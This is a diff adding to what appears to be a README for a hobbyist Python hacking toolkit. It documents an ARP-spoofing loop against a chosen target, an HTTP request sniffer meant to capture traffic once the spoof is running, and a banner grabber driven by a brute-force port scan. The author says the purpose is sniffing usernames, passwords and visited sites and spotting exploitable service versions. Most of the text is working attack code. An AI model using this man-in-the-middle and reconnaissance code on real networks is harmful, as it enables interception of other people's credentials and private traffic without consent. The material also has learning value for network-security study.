@@ -481,4 +481,97 @@ def restore(target_ip,host_ip,target_mac,host_mac):
 
 ### But why?
 This arp spoofer allows us to listen to what is being sent on the network, we may be able to sniff some info such as usernames/passwords or websites visited etc. 
-I am currently making a http packet sniffer to use once an arp spoof has taken place but it needs testing...
+I am currently making a http packet sniffer to use once an arp spoof has taken place but it needs testing... I am unable to test if this works since we need a network connected to the internet. :( 
+
+However, the code is here:
+
+```python
+def http_header(packet):
+        if packet.haslayer(HTTPRequest):
+                url=packet[HTTPRequest].Host.decode()+packet[HTTPRequest].Path.decode()
+                ip = packet[IP].src
+                method = packet[HTTPRequest].Method.decode()
+                print(str(ip) + " requested " + str(url) + " with " + str(method))
+```
+It may be useful to see how I call these functions since some of them require some arguments from earlier in the program. 
+
+```python
+ if n==7:
+                        os.system('clear')
+                        i=0
+                        print("IP's : " + str(success))
+                        ip_choice=input("Enter index of target ip: ")
+                        arp_target=str(success[ip_choice])
+                        arp_host = get_ip_address('eth0')
+                        target_mac= get_mac_address(ip=arp_target)
+                        print("MAC of target is: " + str(target_mac))
+                        host_mac= get_mac_address(interface='eth0')
+                        enable_linux_iproute()
+
+                        while(i!=1):
+                                try:
+
+                                        spoof(arp_target,arp_host,target_mac)
+                                        spoof(arp_host,arp_target,host_mac)
+                                        time.sleep(1)
+                                except KeyboardInterrupt:
+                                        arp_done=1
+                                        i=1
+                if n==8 and arp_done ==1 :
+                        print("Restoring Network...")
+                        restore(arp_target,arp_host,target_mac,host_mac)
+                        restore(arp_host,arp_target,host_mac,target_mac)
+                if n==9:
+                        os.system('clear')
+                        sniffer_menu()
+                elif n==8 and arp_done ==0:
+                        print("ARP spoof hasn't been done yet...")
+```
+
+- For the arp spoofing, I call spoof twice but switch host and target around. 
+- If there is a keyboard interrupt then break out and return to the menu
+- You can only restore addresses from arp spoof if you have done it first. It checks if the arp spoof is done and if it is, it lets you restore.
+- Other option calls the menu for network sniffing...
+
+
+
+## Banner Grabber:
+Added a banner grabber, grabs banners for services running on open ports on a target machine and prints them. 
+```python
+def bannergrabbing(address,portlist):
+        print("\n-------------------------------\n")
+        for i in range(0,len(portlist)):
+                port=portlist[i]
+                print("Getting service info for: " + str(port))
+                socket.setdefaulttimeout(2)
+                bannergrab=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                try:
+                        bannergrab.connect((address,port))
+                        bannergrab.send('WhoAreYou\r\n')
+                        banner=bannergrab.recv(100)
+                        bannergrab.close()
+                        print(str(banner) + "\n")
+                except:
+                        print("Can't connect to port: " + str(port))
+```
+- Gets open ports by port scanning the target ip with the brute force function, that tries all possible ports.
+- Takes in the ip of the machine and a list of open ports.
+- Loops through each open port and tries to retrieve the banner
+- Does this by sending any data e.g. whoareyou, and recieving whatever comes back.
+
+### But why?
+This will allow us to see what services are running on what ports. However, it can be easily disabled. This is an easy way to do it without packet crafting, in some cases it could also expose some vulnerable versions of services running that could be exploited.
+
+The way I call it in the menu can be a bit confusing, so I will show it here:
+```python
+ print("Detected IP addresses are: " + str(success))
+ ip_choice=input("Enter the index of target ip: ")
+ bannertarget=str(success[ip_choice])
+ bannergrabbing(bannertarget,Portscan(success[ip_choice],2))
+```
+
+- Gets user input for the target ip for the banner grabbing.
+- Gets openports by calling the portscan function with the target ip and the second choice which is the brute force option.
+
+
+
